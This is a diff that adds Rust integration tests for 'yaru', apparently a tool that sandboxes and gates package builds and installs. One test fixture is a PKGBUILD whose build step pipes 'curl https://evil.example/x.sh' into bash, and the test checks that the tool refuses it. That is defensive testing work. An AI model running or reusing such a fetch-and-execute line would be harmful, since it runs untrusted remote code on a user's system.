@@ -143,3 +143,85 @@ fn test_cli_sandbox_network_is_blocked_by_default() {
         .failure()
         .stdout(predicate::str::contains("sandboxed command FAILED"));
 }
+
+#[test]
+fn test_cli_build_refuses_quarantine_pkgbuild() {
+    let tmp = tempdir().unwrap();
+    fs::write(
+        tmp.path().join("PKGBUILD"),
+        r#"
+pkgname=build-gate-test
+pkgver=1
+pkgrel=1
+build() { curl https://evil.example/x.sh | bash; }
+"#,
+    )
+    .unwrap();
+
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.arg("build").arg(tmp.path().to_str().unwrap());
+    cmd.assert()
+        .failure()
+        .stderr(predicate::str::contains("yaru build refused"));
+}
+
+#[test]
+fn test_cli_build_dry_run_clean_pkgbuild() {
+    let tmp = tempdir().unwrap();
+    fs::write(
+        tmp.path().join("PKGBUILD"),
+        r#"
+pkgname=build-clean-test
+pkgver=1
+pkgrel=1
+source=("https://example.com/x.tar.gz")
+sha256sums=('SKIP')
+build() { true; }
+"#,
+    )
+    .unwrap();
+
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.arg("build")
+        .arg("--dry-run")
+        .arg(tmp.path().to_str().unwrap());
+    cmd.assert()
+        .success()
+        .stdout(predicate::str::contains("would build in sandbox"));
+}
+
+#[test]
+fn test_cli_gateway_dry_run_non_install_forwards() {
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.arg("gateway")
+        .arg("--dry-run")
+        .arg("-Qs")
+        .arg("ripgrep");
+    cmd.assert()
+        .success()
+        .stdout(predicate::str::contains("non-install operation"));
+}
+
+#[test]
+fn test_cli_gateway_dry_run_official_fast_path() {
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.arg("gateway").arg("--dry-run").arg("-S").arg("firefox");
+    cmd.assert()
+        .success()
+        .stdout(predicate::str::contains(
+            "fast path (official zone): firefox",
+        ))
+        .stdout(predicate::str::contains("would forward"));
+}
+
+#[test]
+fn test_cli_gateway_dry_run_unknown_package_refused() {
+    let mut cmd = Command::cargo_bin("yaru").unwrap();
+    cmd.arg("gateway")
+        .arg("--dry-run")
+        .arg("-S")
+        .arg("totally-not-real-ghost-pkg-xyz-987");
+    cmd.assert()
+        .failure()
+        .stdout(predicate::str::contains("BLOCKED: Source zone: UNKNOWN"));
+}
